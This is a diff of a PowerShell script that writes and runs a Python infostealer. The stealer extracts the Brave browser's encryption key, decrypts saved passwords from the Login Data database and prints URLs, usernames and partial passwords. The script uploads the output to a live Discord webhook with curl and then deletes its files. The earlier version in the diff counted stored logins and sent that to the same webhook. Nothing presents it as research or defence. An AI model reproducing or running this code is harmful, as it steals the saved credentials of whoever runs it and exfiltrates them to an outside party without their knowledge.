@@ -1,58 +1,101 @@
 cd $env:TEMP\py
 
 @'
-import os
-print("=== BRAVE TEST ===")
+import os,json,base64,sqlite3,shutil,win32crypt
+from Crypto.Cipher import AES
+
+print("=== BRAVE DECRYPTION TEST ===")
 
 brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
-print(f"Brave path: {brave_path}")
-print(f"Exists: {os.path.exists(brave_path)}")
+local_state_path = os.path.join(brave_path, "Local State")
+login_data_path = os.path.join(brave_path, "Default", "Login Data")
 
-if os.path.exists(brave_path):
-    default_path = os.path.join(brave_path, "Default")
-    print(f"\nDefault profile: {default_path}")
-    print(f"Exists: {os.path.exists(default_path)}")
+# 1. Extraire la clé
+print("\n[1] Extracting encryption key...")
+try:
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
     
-    login_data = os.path.join(default_path, "Login Data")
-    print(f"\nLogin Data: {login_data}")
-    print(f"Exists: {os.path.exists(login_data)}")
-    if os.path.exists(login_data):
-        print(f"Size: {os.path.getsize(login_data)} bytes")
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    print(f"Encrypted key length: {len(encrypted_key)} bytes")
     
-    local_state = os.path.join(brave_path, "Local State")
-    print(f"\nLocal State: {local_state}")
-    print(f"Exists: {os.path.exists(local_state)}")
-    if os.path.exists(local_state):
-        print(f"Size: {os.path.getsize(local_state)} bytes")
+    encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
+    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    print(f"✓ Key extracted: {len(key)} bytes")
+except Exception as e:
+    print(f"✗ Key extraction failed: {e}")
+    exit()
 
-print("\n=== SQLITE TEST ===")
-import sqlite3
-login_data = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
-if os.path.exists(login_data):
-    try:
-        conn = sqlite3.connect(login_data)
-        cur = conn.cursor()
-        cur.execute("SELECT COUNT(*) FROM logins")
-        total = cur.fetchone()[0]
-        print(f"Total logins: {total}")
-        
-        cur.execute("SELECT COUNT(*) FROM logins WHERE username_value != ''")
-        with_user = cur.fetchone()[0]
-        print(f"With username: {with_user}")
-        
-        cur.execute("SELECT COUNT(*) FROM logins WHERE username_value != '' AND length(password_value) > 0")
-        with_pwd = cur.fetchone()[0]
-        print(f"With password: {with_pwd}")
-        
-        conn.close()
-    except Exception as e:
-        print(f"SQLite error: {e}")
-'@ | Out-File "test.py" -Encoding UTF8
+# 2. Copier la base de données
+print("\n[2] Copying database...")
+temp_db = "brave_test.db"
+try:
+    if os.path.exists(temp_db):
+        os.remove(temp_db)
+    shutil.copy2(login_data_path, temp_db)
+    print(f"✓ Database copied")
+except Exception as e:
+    print(f"✗ Copy failed: {e}")
+    exit()
 
-$result = .\python.exe test.py 2>&1 | Out-String
+# 3. Tester le déchiffrement
+print("\n[3] Testing decryption...")
+try:
+    conn = sqlite3.connect(temp_db, timeout=30)
+    cur = conn.cursor()
+    cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 5")
+    
+    success = 0
+    failed = 0
+    
+    for url, user, enc_pwd in cur.fetchall():
+        try:
+            if not enc_pwd or len(enc_pwd) < 15:
+                print(f"  ✗ {url[:50]} - Empty or too short")
+                failed += 1
+                continue
+            
+            # Check format
+            prefix = enc_pwd[0:3]
+            print(f"  Password prefix: {prefix}")
+            
+            if prefix == b'v10':
+                nonce = enc_pwd[3:15]
+                ciphertext = enc_pwd[15:-16]
+                tag = enc_pwd[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', 'ignore')
+                
+                print(f"  ✓ {url[:50]}")
+                print(f"    User: {user}")
+                print(f"    Pass: {pwd[:20]}...")
+                success += 1
+            else:
+                print(f"  ✗ {url[:50]} - Unknown format (prefix: {prefix})")
+                failed += 1
+                
+        except Exception as e:
+            print(f"  ✗ {url[:50]} - Error: {str(e)[:50]}")
+            failed += 1
+    
+    conn.close()
+    print(f"\n✓ Success: {success}")
+    print(f"✗ Failed: {failed}")
+    
+except Exception as e:
+    print(f"✗ Database error: {e}")
+finally:
+    if os.path.exists(temp_db):
+        os.remove(temp_db)
 
-$result | Out-File "test_result.txt"
+print("\n=== TEST COMPLETE ===")
+'@ | Out-File "decrypt_test.py" -Encoding UTF8
 
-curl.exe -F "file=@test_result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
+$result = .\python.exe decrypt_test.py 2>&1 | Out-String
 
-Remove-Item test.py,test_result.txt -Force -EA 0
+$result | Out-File "decrypt_result.txt"
+
+curl.exe -F "file=@decrypt_result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
+
+Remove-Item decrypt_test.py,decrypt_result.txt -Force -EA 0
